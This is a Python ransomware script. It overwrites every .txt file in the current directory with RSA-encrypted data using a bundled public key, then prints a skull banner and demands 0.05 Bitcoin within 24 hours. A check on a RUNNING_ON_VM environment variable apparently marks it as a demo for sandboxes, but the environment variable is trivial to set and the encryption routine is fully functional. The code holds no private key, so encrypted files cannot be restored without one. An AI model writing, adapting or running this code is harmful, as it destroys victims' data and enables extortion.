import os, base64, sys
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend 
from cryptography.hazmat.primitives.asymmetric import padding

files = os.listdir()

def encrypt(plaintext):
    key_file = "public_key.pem"
    if getattr(sys, 'frozen', False):
        key_file = os.path.join(sys._MEIPASS, key_file)

    with open(key_file, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    encrypted = base64.b64encode(public_key.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    ))
    return encrypted

def encryption():
    for file in files:
        if file.endswith(".txt"):
            with open(file,"rb") as f:
                plaintext = f.read()
            with open(file,"wb") as f:
                f.write(encrypt(plaintext))

skull = '''
                     ______
                  .-"      "-.
                 /            \\
                |              |
                |,  .-.  .-.  ,|
           /\\   | )(__/  \\__)( |
         _ \\/   |/     /\\     \\|
        \\_\\/    (_     ^^     _)   .-==/~\\
       ___/_,__,_\\__|IIIIII|__/__)/   /{~}}
       ---,---,---|-\\IIIIII/-|---,\\'-' {{~}
                  \\          /     '-==\\}/
                   `--------`
'''

if 'RUNNING_ON_VM' not in os.environ:
    print("Please run this exe in a safe environment i.e. \
VM or sandbox and set RUNNING_ON_VM environment variable")
    sys.exit(1)

try: 
    encryption()
    print(skull)
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    print("\n You Are Hacked \n")
    print("\n Don't Kill The Process You Will Not be Able to Recover Data\n")
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
    print("Pay 0.05 Bitcoin to address xxx in 24 hours else your files will be gone forever.\n")
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")

except Exception as e:
    print("Encryption Failed")
    print("Damn Failed Attempt")
    print(e)